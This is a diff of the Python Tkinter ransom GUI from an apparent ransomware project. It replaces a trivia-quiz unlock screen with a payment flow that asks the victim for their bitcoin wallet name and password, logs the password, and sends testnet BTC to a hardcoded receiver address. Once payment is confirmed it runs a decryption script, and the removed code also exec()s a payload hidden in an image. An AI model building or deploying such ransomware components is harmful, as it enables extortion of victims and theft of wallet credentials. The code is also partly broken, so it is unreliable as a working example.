@@ -1,117 +1,153 @@
 from tkinter import *
 from PIL import Image, ImageTk
-from extract import extract_message
-
-# List of question-answer pairs to be prompted to a user
-q_and_a = ({"What kind of cyber attack is this?": ("ransomware",)},
-           {"When was the first recorded case of a ransomware attack?": 1989},
-           {"How much was the largest ransomware payment ever made (in millions)?": ("75", "$75")})
-
-# Sets up window containing an image
-window = Tk()
-window.title("Riddle me this...")
-image = Image.open("Popup.png")
-photo = ImageTk.PhotoImage(image)
-label = Label(window, image=photo)
-label.pack()
-window.geometry("572x550")
-
-# Sets up icon image
-icon_image = ImageTk.PhotoImage(file="icon.png")
-window.iconphoto(False, icon_image)
+from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
+from bitcoinlib.services.services import Service
 
 
 def clicking_submit():
-    """
-    The command to be run when the user clicks the Submit button on the GUI. Each time it is clicked,
-    it compares the user's input with the valid answers for each question and reduces the number of attempts
-    left. Drives the program to either (1) decrypt a users files if they answer all the questions correctly
-    or (2) close out and not do anything if a user exhausts their attempts.
-    """
-    num_correct: int = 0
+    global round
 
-    # Iterates through each response entry and checks if it aligns with the expected answer
-    for index, response in enumerate(response_entries):
-        # Retrieves the corresponding user response and answer to a particular question
-        response = response_entries[index].get()
-        correct_answer = answers[index]
+    # Performs the model logic associated with opening a testnet wallet
+    if round == 1:
+        wallet_name: str = response_entry1.get()
+        wallet_password: str = response_entry2.get()
+        # TODO: Get rid of print statements in final product. Just for debugging purposes
+        print(wallet_name)
+        print(wallet_password)
 
-        # Checks if the user neglected to fill in one of the entries
-        if response == "":
-            print("Incorrect")
-            break
+        # If user provides input for an existing bitcoin wallet, moves on to next round
+        if wallet_exists(wallet_name):
+            global wallet
+            # TODO: Password doesn't seem to matter as long as the wallet name is correct?
+            wallet = wallet_create_or_open(wallet_name,
+                                           password=wallet_password,
+                                           network="testnet")
+            print(f"Wallet Address: {wallet.get_key().address}")
+            round += 1
+            for widget in window.winfo_children():
+                if widget != image_label:
+                    widget.destroy()
+            setup_round_2()
 
-        # Determines the format for evaluating if a response is correct based on whether it's fixed (an int)
-        # or not fixed (has multiple values in the form of a string)
-        if isinstance(correct_answer, int):
-            correct = (int(response) == correct_answer)
         else:
-            correct = (response.lower() in correct_answer)
+            wallet_exists_label = Label(window,
+                                        text="Wallet not found! Verify the name of your bitcoin wallet.",
+                                        fg="red")
+            wallet_exists_label.pack(pady=2)
 
-        if correct:
-            print("Correct!")
-            num_correct += 1
-            # Updates the flag to tell the program that the user has met the requirements to have their
-            # files decrypted
-            if num_correct == len(q_and_a):
-                print("You win! Decrypting your files now...")
-                # Closes out the window and decrypts the user's files
-                window.destroy()
-                # TODO: Should execute the script to decrypt the encrypted files
-                # TODO: Change this to .exe before compiling it to such otherwise, might not work
-                exec("decrypt.py")
+    elif round == 2:
+        global amount_to_send
+
+        amount_to_send = float(response_entry3.get())
+        print(f"Amount to Send: {amount_to_send}")
+
+        balance = float(wallet.balance())
+        print(f"Wallet Balance: {balance}")
+
+        if amount_to_send > balance:
+            warning_label = Label(window, text="Insufficient funds! Add more testnet BTC to your wallet.", fg="red")
+            warning_label.pack(pady=2)
         else:
-            print("Incorrect.")
-            break
+            success_label = Label(window, text="Transaction valid! Initiating transaction now...", fg="green")
+            success_label.pack(pady=2)
 
-    # Allows the program to decrement the variable "attempts_left" at the global level
-    global attempts_left
-    attempts_left -= 1
+            round += 1
 
-    # Updates the label displaying the number of attempts left
-    attempt_label.config(text=f"Attempts Left: {attempts_left}")
+            # Transition to the next round
+            for widget in window.winfo_children():
+                if widget != image_label:
+                    widget.destroy()
 
-    # Exits out of program when user exhausts their attempts
-    if attempts_left == 0:
-        # Retrieves code secretly embedded in one of the images to decrypt the hosts' encrypted data
-        code_to_decrypt: str = extract_message("download3.jpg", "Mochi")
-        print("You ran out of attempts! Good luck decrypting your files!")
-        # Destroys the displayed window
-        window.destroy()
-        # Executes the decryption code
-        exec(code_to_decrypt)
+    elif round == 3:
+        # The address of my testnet bitcoin wallet
+        receiver_address: str = "tb1q502wsjnar03w82u56cxrn7yhrltc5w6kzxfrz9"
+
+        # Carries out the transaction
+        wallet_transaction = wallet.send_to(receiver_address, amount_to_send, network="testnet")
+
+        # Queries through the testnet database to retrieve
+        service = Service(network="testnet")
+        transaction_details = service.gettransaction(wallet_transaction.txid)
+
+        #  Iterates through transaction details to retrieve the
+        transaction_details = transaction_details.get('outputs', [])
+        for output in transaction_details:
+            address = output.get('address')
+            # Checks if the user successfully sent the specified number of bitcoins
+            if address == receiver_address:
+                import os
+                decryption_executable_files = ["decrypt.py", "decrypt.exe"]
+                # Looks for the decryption file to decrypt a user's file
+                for executable in decryption_executable_files:
+                    if os.path.exists(executable):
+                        transaction_details_label = Label(text=transaction_details, fg="blue")
+                        transaction_details_label.pack()
+                        successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)", fg="green")
+                        successful_transaction_label.pack()
+                        exec(f"{executable}")
+
+        print(f"\nTransaction Details: {transaction_details}")
 
 
-# Initializes the number of user attempts to be 3
-attempts_left: int = 3
+def setup_round_1():
+    global response_entry1, response_entry2, labels_and_entries_1
 
-# Displays the number of attempts a user has remaining
-attempt_label = Label(window, text=f"Attempts Left: {attempts_left}", font=('Arial', 10, 'bold'))
-attempt_label.pack(pady=2)
+    name_label = Label(window, text="Name of Your Bitcoin Wallet", font=('Arial', 10, 'bold'))
+    name_label.pack(pady=2)
+    response_entry1 = Entry(window, width=30)
+    response_entry1.pack(pady=5)
 
-# Stores reference to the entries and labels displayed
-response_entries = []
-answers = []
+    password_label = Label(window, text="Password of Your Bitcoin Wallet", font=('Arial', 10, 'bold'))
+    password_label.pack(pady=2)
+    response_entry2 = Entry(window, width=30, show='*')
+    response_entry2.pack(pady=5)
 
-# Iterates through each individual question-answer pair in q_and_a
-for question_answer_pair in q_and_a:
-    # Unpacks the key-value pair from question_answer_pair as the question and answer respectively
-    for question, answer in question_answer_pair.items():
-        # Displays a question from the dictionary variable "question_answer_pair"
-        question_label = Label(window, text=question, font=('Arial', 10, 'bold'))
-        question_label.pack(pady=2)
+    submit_button = Button(window, text="Submit", command=clicking_submit, pady=4, borderwidth=2)
+    submit_button.pack()
 
-        # Create and pack the entry for each answer
-        response_entry = Entry(window, width=30)
-        response_entry.pack(pady=5)
+    labels_and_entries_1 = [name_label, response_entry1, password_label, response_entry2, submit_button]
 
-        # Adds each
-        answers.append(answer)
-        response_entries.append(response_entry)
 
-# Creates a button for the user to interact with in the GUI
-submit_button = Button(window, text="Submit", command=clicking_submit)
-submit_button.pack()
+def setup_round_2():
+    global response_entry3, labels_and_entries_2
 
-# Used to keep window open and reactive to any events (i.e. clicking the submit button)
+    wallet_address_label = Label(window, text=f"Your testnet wallet address: {wallet.get_key().address}",
+                                 font=('Arial', 10, 'bold'))
+    wallet_address_label.pack(pady=2)
+
+    wallet_balance_label = Label(window, text=f"Current Balance: {wallet.balance()} tBTC", font=('Arial', 10, 'bold'),
+                                 fg="green")
+    wallet_balance_label.pack(pady=2)
+
+    amount_bitcoin_to_send_label = Label(window, text="Enter the Amount of Bitcoins to Send",
+                                         font=('Arial', 10, 'bold'))
+    amount_bitcoin_to_send_label.pack(pady=2)
+
+    response_entry3 = Entry(window, width=30)
+    response_entry3.pack(pady=5)
+
+    submit_button = Button(window, text="Submit", command=clicking_submit, pady=4, borderwidth=2)
+    submit_button.pack()
+
+    labels_and_entries_2 = [wallet_address_label, wallet_balance_label, amount_bitcoin_to_send_label, response_entry3,
+                            submit_button]
+
+
+# Main Window Setup
+window = Tk()
+window.title("Decryption for Ransom")
+image = Image.open("Popup.png")
+resized_image = image.resize((673, 383))
+photo = ImageTk.PhotoImage(resized_image)
+image_label = Label(window, image=photo)
+image_label.pack()
+window.geometry("675x550")
+
+icon_image = ImageTk.PhotoImage(file="icon.png")
+window.iconphoto(False, icon_image)
+
+# Initializes the round and displays widgets for first window frame
+round = 1
+setup_round_1()
+
 window.mainloop()
